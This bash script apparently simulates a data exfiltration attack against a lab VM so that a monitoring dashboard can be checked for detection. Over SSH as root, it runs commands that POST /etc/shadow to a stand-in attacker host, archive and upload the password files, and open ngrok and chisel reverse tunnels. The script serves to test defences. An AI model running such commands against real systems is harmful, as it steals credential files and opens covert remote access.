#!/usr/bin/env bash
# Data Exfiltration Attack
# curl POST with stolen data, tar+nc piping, ngrok tunneling, chisel reverse proxy.
#
# Usage:  scripts/attack-data-exfiltration.sh [VM-IP]
# Default VM IP: 192.168.1.79
#
# Dashboard: http://<VM-IP>:5173
# What to look for: data_exfiltration category, curl -X POST/ngrok in commands

set -euo pipefail
IP="${1:-192.168.1.79}"
echo ""
echo "==================================================================="
echo "  Data Exfiltration Attack"
echo "==================================================================="
echo "  Target:    $IP:2222"
echo "  Category:  data_exfiltration"
echo "==================================================================="
echo ""

sshpass -p "password" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -p 2222 \
  root@$IP \
  "curl -X POST -d @/etc/shadow http://evil.example.com/collect ; tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow ; curl -F 'file=@/tmp/exfil.tar.gz' http://evil.example.com/upload ; ngrok tcp 22 ; chisel client 198.51.100.1:8080 R:2222:localhost:22" 2>&1 || true

echo ""
echo "  ✓ Attack complete"
echo "  → Dashboard:  http://$IP:5173"
echo "  → API check:  curl -s http://$IP:5000/api/events?attack_category=data_exfiltration&limit=3 | python3 -m json.tool"
echo ""
